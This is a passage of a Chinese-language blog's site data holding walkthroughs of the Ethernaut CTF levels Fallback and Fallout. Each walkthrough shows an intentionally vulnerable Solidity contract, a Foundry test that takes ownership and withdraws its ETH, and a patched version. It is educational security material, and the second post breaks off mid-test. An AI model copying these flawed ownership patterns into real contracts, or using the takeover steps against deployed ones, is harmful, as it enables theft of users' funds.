id=\"3-安全开发最佳实践\"><a href=\"#3-安全开发最佳实践\" class=\"headerlink\" title=\"3. 安全开发最佳实践\"></a>3. 安全开发最佳实践</h3><ul>\n<li><strong>避免在特殊函数中实现关键逻辑</strong></li>\n<li><strong>使用 OpenZeppelin 的 Ownable 模式</strong></li>\n<li><strong>充分的单元测试覆盖</strong></li>\n<li><strong>代码审计和同行评审</strong></li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Fallback 关卡虽然简单，但展示了智能合约安全的基础概念：</p>\n<ul>\n<li>✅ <strong>函数职责分离的重要性</strong></li>\n<li>✅ <strong>权限验证的必要性</strong> </li>\n<li>✅ <strong>特殊函数的使用注意事项</strong></li>\n<li>✅ <strong>Foundry 测试框架的基本使用</strong></li>\n</ul>\n<p>这是学习智能合约安全的良好起点，为后续更复杂的攻击技术打下基础。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">下一关: Level 2 - Fallout</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>在智能合约的世界中，最简单的漏洞往往隐藏着最深刻的安全教训。</em> 🎓</p>\n","more":"<h1 id=\"🎯-Ethernaut-Level-1-Fallback-回退函数权限提升攻击\"><a href=\"#🎯-Ethernaut-Level-1-Fallback-回退函数权限提升攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 1: Fallback - 回退函数权限提升攻击\"></a>🎯 Ethernaut Level 1: Fallback - 回退函数权限提升攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/1\">Ethernaut Level 1 - Fallback</a><br><strong>攻击类型</strong>: 权限提升、Fallback 函数漏洞<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这是 Ethernaut 系列的第一个正式关卡，目标非常明确：</p>\n<ol>\n<li><strong>获取合约控制权</strong> - 成为合约的 <code>owner</code></li>\n<li><strong>转出所有余额</strong> - 提取合约中的所有 ETH</li>\n</ol>\n<p><img src=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp\" alt=\"Fallback Challenge\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><p>首先，我们来分析目标合约的关键代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Fallback &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public contributions;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function contribute() public payable &#123;</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether);</span><br><span class=\"line\">        contributions[msg.sender] += msg.value;</span><br><span class=\"line\">        if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function getContribution() public view returns (uint) &#123;</span><br><span class=\"line\">        return contributions[msg.sender];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public onlyOwner &#123;</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 🚨 关键漏洞点</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function getOwner() public view returns (address) &#123;</span><br><span class=\"line\">        return owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p>通过代码审计，我们发现了两种成为 <code>owner</code> 的方式：</p>\n<p><strong>方式一：通过 <code>contribute()</code> 函数</strong></p>\n<ul>\n<li>需要贡献超过 1000 ETH 才能获得控制权</li>\n<li>每次调用限制最多 0.001 ETH</li>\n<li>需要调用超过 100 万次，成本过高 ❌</li>\n</ul>\n<p><strong>方式二：通过 <code>receive()</code> 函数</strong> ⭐</p>\n<ul>\n<li>只需满足两个简单条件：<ol>\n<li><code>msg.value &gt; 0</code> - 发送任意数量的 ETH</li>\n<li><code>contributions[msg.sender] &gt; 0</code> - 之前有过贡献记录</li>\n</ol>\n</li>\n<li>满足条件后直接成为 <code>owner</code> ✅</li>\n</ul>\n<h3 id=\"攻击路径\"><a href=\"#攻击路径\" class=\"headerlink\" title=\"攻击路径\"></a>攻击路径</h3><ol>\n<li><strong>建立贡献记录</strong> - 调用 <code>contribute()</code> 发送少量 ETH</li>\n<li><strong>触发权限提升</strong> - 直接向合约发送 ETH 触发 <code>receive()</code></li>\n<li><strong>提取资金</strong> - 调用 <code>withdraw()</code> 提取所有余额</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Fallback.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract FallbackTest is Test &#123;</span><br><span class=\"line\">    Fallback public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        instance = new Fallback();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给攻击者一些初始资金</span><br><span class=\"line\">        vm.deal(attacker, 1 ether);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给合约一些初始余额</span><br><span class=\"line\">        vm.deal(address(instance), 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testFallbackExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤1: 先贡献少量ETH以满足contributions[msg.sender] &gt; 0</span><br><span class=\"line\">        instance.contribute&#123;value: 0.0001 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证贡献记录</span><br><span class=\"line\">        assertGt(instance.getContribution(), 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤2: 直接向合约发送ETH触发receive()函数</span><br><span class=\"line\">        (bool sent, ) = address(instance).call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(sent, &quot;Failed to send Ether to the Fallback&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证已成为owner</span><br><span class=\"line\">        assertEq(instance.getOwner(), attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤3: 提取所有资金</span><br><span class=\"line\">        uint256 initialBalance = attacker.balance;</span><br><span class=\"line\">        instance.withdraw();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证资金提取成功</span><br><span class=\"line\">        assertGt(attacker.balance, initialBalance);</span><br><span class=\"line\">        assertEq(address(instance).balance, 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行 Fallback 关卡测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出应该显示所有断言通过</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"问题根源\"><a href=\"#问题根源\" class=\"headerlink\" title=\"问题根源\"></a>问题根源</h3><ol>\n<li><strong>权限检查不当</strong> - <code>receive()</code> 函数中没有适当的权限验证</li>\n<li><strong>逻辑设计缺陷</strong> - 允许通过简单条件获得完整控制权</li>\n<li><strong>函数职责混乱</strong> - 接收资金的函数不应包含权限变更逻辑</li>\n</ol>\n<h3 id=\"安全修复建议\"><a href=\"#安全修复建议\" class=\"headerlink\" title=\"安全修复建议\"></a>安全修复建议</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureFallback &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public contributions;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function contribute() public payable &#123;</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether);</span><br><span class=\"line\">        contributions[msg.sender] += msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ✅ 提高门槛，避免简单的权限提升</span><br><span class=\"line\">        if(contributions[msg.sender] &gt; contributions[owner] &amp;&amp; </span><br><span class=\"line\">           contributions[msg.sender] &gt; 10 ether) &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ✅ 移除权限变更逻辑，只处理资金接收</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        // 仅记录接收的资金，不修改权限</span><br><span class=\"line\">        emit FundsReceived(msg.sender, msg.value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw() public onlyOwner &#123;</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event FundsReceived(address sender, uint amount);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-Fallback-和-Receive-函数\"><a href=\"#1-Fallback-和-Receive-函数\" class=\"headerlink\" title=\"1. Fallback 和 Receive 函数\"></a>1. Fallback 和 Receive 函数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// receive() - 接收纯ETH转账时调用</span><br><span class=\"line\">receive() external payable &#123;</span><br><span class=\"line\">    // 处理逻辑</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// fallback() - 调用不存在的函数或带数据的ETH转账时调用</span><br><span class=\"line\">fallback() external payable &#123;</span><br><span class=\"line\">    // 处理逻辑</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-权限设计原则\"><a href=\"#2-权限设计原则\" class=\"headerlink\" title=\"2. 权限设计原则\"></a>2. 权限设计原则</h3><ul>\n<li><strong>最小权限原则</strong> - 给予最少必要的权限</li>\n<li><strong>权限分离</strong> - 不同功能使用不同权限级别</li>\n<li><strong>权限检查</strong> - 在关键操作前进行充分验证</li>\n</ul>\n<h3 id=\"3-安全开发最佳实践\"><a href=\"#3-安全开发最佳实践\" class=\"headerlink\" title=\"3. 安全开发最佳实践\"></a>3. 安全开发最佳实践</h3><ul>\n<li><strong>避免在特殊函数中实现关键逻辑</strong></li>\n<li><strong>使用 OpenZeppelin 的 Ownable 模式</strong></li>\n<li><strong>充分的单元测试覆盖</strong></li>\n<li><strong>代码审计和同行评审</strong></li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Fallback 关卡虽然简单，但展示了智能合约安全的基础概念：</p>\n<ul>\n<li>✅ <strong>函数职责分离的重要性</strong></li>\n<li>✅ <strong>权限验证的必要性</strong> </li>\n<li>✅ <strong>特殊函数的使用注意事项</strong></li>\n<li>✅ <strong>Foundry 测试框架的基本使用</strong></li>\n</ul>\n<p>这是学习智能合约安全的良好起点，为后续更复杂的攻击技术打下基础。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">下一关: Level 2 - Fallout</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>在智能合约的世界中，最简单的漏洞往往隐藏着最深刻的安全教训。</em> 🎓</p>\n"},{"title":"Ethernaut Level 2: Fallout - 构造函数命名漏洞","date":"2025-01-25T06:20:00.000Z","updated":"2025-01-25T06:20:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"学习如何利用 Solidity 早期版本构造函数命名错误导致的权限漏洞，了解代码审计中的细节重要性。","_content":"\n# 🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞\n\n> **关卡链接**: [Ethernaut Level 2 - Fallout](https://ethernaut.openzeppelin.com/level/2)  \n> **攻击类型**: 构造函数命名错误、历史漏洞  \n> **难度**: ⭐☆☆☆☆\n\n## 📋 挑战目标\n\n这个关卡考查的是开发者在代码编写中的细心程度：\n\n1. **获取合约控制权** - 成为合约的 `owner`\n2. **理解历史漏洞** - 学习 Solidity 早期版本的安全问题\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.6.0;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Fallout {\n    \n    using SafeMath for uint256;\n    mapping (address => uint) allocations;\n    address payable public owner;\n\n    /* constructor */\n    function Fal1out() public payable {  // 🚨 注意这里的拼写！\n        owner = msg.sender;\n        allocations[owner] = msg.value;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function allocate() public payable {\n        allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n    }\n\n    function sendAllocation(address payable allocator) public {\n        require(allocations[allocator] > 0);\n        allocator.transfer(allocations[allocator]);\n    }\n\n    function collectAllocations() public onlyOwner {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    function allocatorBalance(address allocator) public view returns (uint) {\n        return allocations[allocator];\n    }\n}\n```\n\n### 漏洞识别\n\n仔细观察合约代码，我们发现一个**极其微妙但致命的错误**：\n\n```solidity\n// 合约名称\ncontract Fallout {\n\n    /* constructor */\n    function Fal1out() public payable {  // ❌ 这里是 \"Fal1out\" (数字1)\n        owner = msg.sender;             // 而不是 \"Fallout\" (字母l)\n        allocations[owner] = msg.value;\n    }\n}\n```\n\n### 历史背景\n\n在 **Solidity 0.4.22** 之前，构造函数的定义方式是：\n- 创建一个与合约名称**完全相同**的函数\n- 该函数会在合约部署时自动执行一次\n\n但在这个合约中：\n- 合约名称是 `Fallout`（字母 l）\n- 函数名称是 `Fal1out`（数字 1）\n\n**结果**: 这个函数不是构造函数，而是一个**普通的公开函数**！\n\n### 攻击路径\n\n1. **识别伪装的构造函数** - 发现 `Fal1out()` 函数可以被任何人调用\n2. **直接调用函数** - 调用 `Fal1out()` 成为 `owner`\n3. **验证权限获取** - 确认已获得合约控制权\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Fallout.sol\";\n\ncontract FalloutTest is Test {\n    Fallout public instance;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // 部署目标合约\n        instance = new Fallout();\n        \n        // 给攻击者一些初始资金\n        vm.deal(attacker, 1 ether);\n    }\n\n    function testFalloutExploit() public {\n        vm.startPrank(attacker);\n        \n        console.log(\"Original owner:\", instance.owner());\n        console.log(\"Attacker address:\", attacker);\n        \n        // 攻击步骤：直接调用错误命名的\"构造函数\"\n        instance.Fal1out{value: 0.001 ether}();\n        \n        // 验证攻击成功\n        assertEq(instance.owner(), attacker);\n        console.log(\"New owner:\", instance.owner());\n        \n        vm.stopPrank();\n    }\n    \n    function testOriginalOwnerIsZero() public view {\n        // 验证合约部署后没有owner（因为构造函数未执行）\n        assertEq(instance.owner(), address(0));\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行 Fallout 关卡测试\nforge test --match-contract FalloutTest -vvv\n\n# 预期输出：\n# [PASS] testFalloutExploit()\n# [PASS] testOriginalOwnerIsZero()\n```\n\n## 🛡️ 防御措施\n\n### 现代 Solidity 解决方案\n\n从 **Solidity 0.4.22** 开始，引入了 `constructor` 关键字：\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract SecureFallout {\n    address public owner;\n    mapping (address => uint) allocations;\n    \n    // ✅ 使用 constructor 关键字\n    constructor() {\n        owner = msg.sender;\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    // 其他函数...\n}\n```\n\n### 安全最佳实践\n\n1. **使用现代语法**\n```solidity\n// ❌ 旧版本（容易出错）\nfunction ContractName() public {\n    // 构造逻辑\n}\n\n// ✅ 新版本（明确且安全）\nconstructor() {\n    // 构造逻辑\n}\n```\n\n2. **代码审计检查清单**\n```solidity\n// 检查项目：\n// ✅ 构造函数名称与合约名称是否完全匹配\n// ✅ 是否使用了现代 constructor 语法\n// ✅ 是否有多个类似构造函数的函数\n// ✅ 权限初始化是否正确执行\n```\n\n3. **编译器警告**\n```bash\n# 现代编译器会对可疑的函数名发出警告\nWarning: Function state mutability can be restricted to pure\nWarning: This function has the same name as the contract\n```\n\n## 📚 核心知识点\n\n### 1. Solidity 版本演进\n\n| 版本 | 构造函数语法 | 安全性 |\n|------|------------|--------|\n| < 0.4.22 | `function ContractName()` | ❌ 容易拼写错误 |\n| >= 0.4.22 | `constructor()` | ✅ 明确且安全 |\n\n### 2. 常见命名错误\n\n```solidity\ncontract MyContract {\n    // ❌ 常见错误类型\n    function MyContracr() public { }  // 拼写错误\n    function myContract() public { }  // 大小写错误\n    function MyContract_() public { } // 多余字符\n    function MyContract() public { }  // 可能正确，但不推荐\n}\n```\n\n### 3. 代码审计重点\n\n- **字符相似性检查** - 1 vs l, 0 vs O\n- **大小写敏感性** - Solidity 区分大小写\n- **额外字符检查** - 下划线、空格等\n- **编码问题** - Unicode 字符混用\n\n## 🔍 实际案例分析\n\n### 历史上的类似漏洞\n\n1. **Rubixi 智能合约** (2016)\n   - 合约从 `DynamicPyramid` 重命名为 `Rubixi`\n   - 忘记更新构造函数名称\n   - 导致任何人都可以成为 owner\n\n2. **其他类似案例**\n   - 复制粘贴代码时忘记修改函数名\n   - 团队协作中的沟通失误\n   - 自动化重构工具的缺陷\n\n### 漏洞影响评估\n\n- **直接影响**: 完全丧失合约控制权\n- **资金风险**: 合约中的所有资金\n- **修复难度**: 无法修复，需要重新部署\n- **检测难度**: 极低，但容易被忽视\n\n## 🎯 总结\n\nFallout 关卡展示了一个看似微不足道但后果严重的漏洞：\n\n- ✅ **细节决定成败** - 一个字符的差异导致完全不同的结果\n- ✅ **工具的重要性** - 现代编译器和工具可以避免此类错误\n- ✅ **代码审计的价值** - 人工审计能发现工具遗漏的问题\n- ✅ **版本升级的必要性** - 使用最新的安全特性\n\n这个案例提醒我们，在智能合约开发中，**没有小错误，只有大损失**。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**\n- **[下一关: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*魔鬼藏在细节中，安全始于每一个字符。* 🔍","source":"_posts/ethernaut-level-02-fallout.md","raw":"---\ntitle: 'Ethernaut Level 2: Fallout - 构造函数命名漏洞'\ndate: 2025-01-25 14:20:00\nupdated: 2025-01-25 14:20:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - 构造函数\n  - 命名漏洞\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"学习如何利用 Solidity 早期版本构造函数命名错误导致的权限漏洞，了解代码审计中的细节重要性。\"\n---\n\n# 🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞\n\n> **关卡链接**: [Ethernaut Level 2 - Fallout](https://ethernaut.openzeppelin.com/level/2)  \n> **攻击类型**: 构造函数命名错误、历史漏洞  \n> **难度**: ⭐☆☆☆☆\n\n## 📋 挑战目标\n\n这个关卡考查的是开发者在代码编写中的细心程度：\n\n1. **获取合约控制权** - 成为合约的 `owner`\n2. **理解历史漏洞** - 学习 Solidity 早期版本的安全问题\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.6.0;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Fallout {\n    \n    using SafeMath for uint256;\n    mapping (address => uint) allocations;\n    address payable public owner;\n\n    /* constructor */\n    function Fal1out() public payable {  // 🚨 注意这里的拼写！\n        owner = msg.sender;\n        allocations[owner] = msg.value;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function allocate() public payable {\n        allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n    }\n\n    function sendAllocation(address payable allocator) public {\n        require(allocations[allocator] > 0);\n        allocator.transfer(allocations[allocator]);\n    }\n\n    function collectAllocations() public onlyOwner {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    function allocatorBalance(address allocator) public view returns (uint) {\n        return allocations[allocator];\n    }\n}\n```\n\n### 漏洞识别\n\n仔细观察合约代码，我们发现一个**极其微妙但致命的错误**：\n\n```solidity\n// 合约名称\ncontract Fallout {\n\n    /* constructor */\n    function Fal1out() public payable {  // ❌ 这里是 \"Fal1out\" (数字1)\n        owner = msg.sender;             // 而不是 \"Fallout\" (字母l)\n        allocations[owner] = msg.value;\n    }\n}\n```\n\n### 历史背景\n\n在 **Solidity 0.4.22** 之前，构造函数的定义方式是：\n- 创建一个与合约名称**完全相同**的函数\n- 该函数会在合约部署时自动执行一次\n\n但在这个合约中：\n- 合约名称是 `Fallout`（字母 l）\n- 函数名称是 `Fal1out`（数字 1）\n\n**结果**: 这个函数不是构造函数，而是一个**普通的公开函数**！\n\n### 攻击路径\n\n1. **识别伪装的构造函数** - 发现 `Fal1out()` 函数可以被任何人调用\n2. **直接调用函数** - 调用 `Fal1out()` 成为 `owner`\n3. **验证权限获取** - 确认已获得合约控制权\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Fallout.sol\";\n\ncontract FalloutTest is Test {\n    Fallout public instance;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // 部署目标合约\n        instance = new Fallout();\n        \n        // 给攻击者一些初始资金\n        vm.deal(attacker, 1 ether);\n    }\n\n    function testFalloutExploit() public {\n        vm.startPrank(attacker);\n        \n        console.log(\"Original owner:\", 